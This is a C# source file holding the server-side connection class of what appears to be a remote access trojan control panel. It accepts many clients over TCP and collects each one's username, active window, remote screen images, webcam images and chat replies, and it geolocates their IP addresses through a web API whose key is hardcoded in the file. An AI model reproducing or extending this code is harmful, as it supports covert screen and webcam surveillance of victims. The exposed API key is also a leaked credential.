using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Net;
namespace WindowsFormsApplication1.Classes
{
    class Connection
    {
        static NetworkStream NS;
        static StreamWriter SW;
        static StreamReader SR;
        static NetworkStream[] NSArray = new NetworkStream[10000];
        static TcpListener TCPListen;
        static Socket TCPSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static List<int> DisconnectedList = new List<int>();
        static int IDNum = 1;
        static bool Listening = false;

        //Command output holding string
        static string[] IP = new string[10000];
        static string[] RDPImage = new string[10000];
        static string[] WebcamImage = new string[10000];
        static string[] ChatReply = new string[10000];
        static string[] Username = new string[10000];
        static string[] Webcam = new string[10000];
        static string[] CurrentWindow = new string[10000];

        public static bool AcceptConnections(int Port)
        {
            try
            {
                TCPListen = new TcpListener(System.Net.IPAddress.Any, Port);
                TCPListen.Start();
                TCPSocket = TCPListen.AcceptSocket();
                IPEndPoint TCPEndPoint = (IPEndPoint)TCPSocket.RemoteEndPoint;
                IP[IDNum] = TCPEndPoint.Address.ToString();
                InitializeStream();

                return true;
            }

            catch { return false; }

        }

        private static bool InitializeStream()
        {
            try
            {
                NS = new NetworkStream(TCPSocket);
                SW = new StreamWriter(NS);
                SR = new StreamReader(NS);
                NSArray[IDNum] = NS;
                IDNum++;
                return true;
            }

            catch { return false; }

        }

        public static NetworkStream GetStream(int ID)
        {
            return NSArray[ID];
        }

        public static string GetIP(int ID)
        {
            return IP[ID];
        }

        public static List<int> UpdateListView()
        {
            return DisconnectedList;
        }

        public static string GetFlag(string IP)
        {
            WebClient WC = new WebClient();
            string[] ParsedPage = WC.DownloadString("http://api.ipinfodb.com/v3/ip-city/?key=e846047219c5e99c257afe5a9fdda9bad875a74c90e7eff4b03796dcf7c9b4c0&ip=" + IP).Split(';');
            WC.Dispose();
            return ParsedPage[3];
        }

        public static void Disconnect()
        {
            IDNum = 1;

            try
            {
                TCPListen.Stop();
                TCPSocket.Dispose();
            }

            catch { }

            try
            {
                NS.Dispose();
            }

            catch { }


            try
            {

                SW.Dispose();
            }

            catch { }



            try
            {
                SR.Dispose();
            }

            catch { }

        }

        public static class StreamListener
        {
            public static void Start(int ClientID)
            {
                StreamReader SReader = new StreamReader(NSArray[ClientID]);
                string[] Data;
                string[] Delimeter = new string[] { "|***|" };
                Listening = true;

                try
                {
                    while (Listening)
                    {
                        Data = SReader.ReadLine().Split(Delimeter, StringSplitOptions.None);

                        switch (Data[0])
                        {
                            case "CURRENTWINDOW":
                                CurrentWindow[ClientID] = Data[1];
                                break;

                            case "HASWEBCAM":
                                Webcam[ClientID] = Data[1];
                                break;

                            case "USERNAME":
                                Username[ClientID] = Data[1];
                                break;

                            case "REMOTEDATA":
                                RDPImage[ClientID] = Data[1];
                                break;

                            case "WEBCAMDATA":
                                WebcamImage[ClientID] = Data[1];
                                break;

                            case "CHATREPLY":
                                ChatReply[ClientID] = Data[1];
                                break;

                            default:
                                break;

                        }
                    }
                }

                catch
                {
                    System.Windows.Forms.MessageBox.Show("Disconnected");
                    DisconnectedList.Add(ClientID);
                }

            }

            public static void StopAll()
            {
                Listening = false;
            }

        }
    }
}
